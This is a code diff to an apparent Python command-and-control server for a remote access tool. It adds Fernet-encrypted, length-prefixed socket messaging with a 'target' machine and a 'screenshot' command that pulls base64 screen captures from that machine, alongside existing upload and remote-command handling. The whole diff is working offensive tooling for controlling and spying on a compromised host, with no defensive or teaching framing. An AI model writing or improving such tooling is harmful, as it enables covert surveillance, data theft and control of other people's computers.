@@ -4,6 +4,7 @@
 ################################################
 
 # Import necessary libraries
+import base64
 import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import os  # This library allows interaction with the operating system.
@@ -16,21 +17,26 @@ cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
     jsondata = json.dumps(data)  # Convert data to JSON format
-    encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data
-    target.send(encrypted_data)  # Send the encrypted data over the network
+    encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data *added*
+    data_len = len(encrypted_data)
+    target.sendall(data_len.to_bytes(4, 'big'))  # Send 4-byte length prefix
+    target.sendall(encrypted_data)
+
 
 # Function to receive data in a reliable way (expects JSON data)
 def reliable_recv():
-    data = b''  # Initialize an empty byte string to hold received data
-    while True:
-        try:
-            data += target.recv(1024)  # Receive data in chunks of 1024 bytes
-            if not data:
-                continue
-            decrypted_data = cipher.decrypt(data)  # Decrypt the received data *added*
-            return json.loads(decrypted_data.decode())  # Parse the received JSON data
-        except ValueError:
-            continue
+    data_len_bytes = target.recv(4)
+    if not data_len_bytes:
+        return None
+    data_len = int.from_bytes(data_len_bytes, 'big')
+    data = b''
+    while len(data) < data_len:
+        packet = target.recv(data_len - len(data))
+        if not packet:
+            return None
+        data += packet
+    decrypted_data = cipher.decrypt(data)
+    return json.loads(decrypted_data.decode())
 
 # Function to upload a file to the target machine
 def upload_file(file_name):
@@ -83,6 +89,17 @@ def target_communication():
         elif command[:6] == 'upload':
             # If the user enters 'upload', initiate the upload of a file to the target.
             upload_file(command[7:])
+        elif command == 'screenshot':
+            # If the user enters 'screenshot', send a command to take a screenshot on the target.
+            shot = reliable_recv()
+            if shot:
+                with open('screenshot.png', 'wb') as f:
+                    f.write(base64.b64decode(shot))
+                # If the screenshot command is successful, print the result.
+                print('[+] Screenshot taken successfully.')
+            else:
+                # If the screenshot command fails, print an error message.
+                print('[-] Failed to take screenshot.')
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
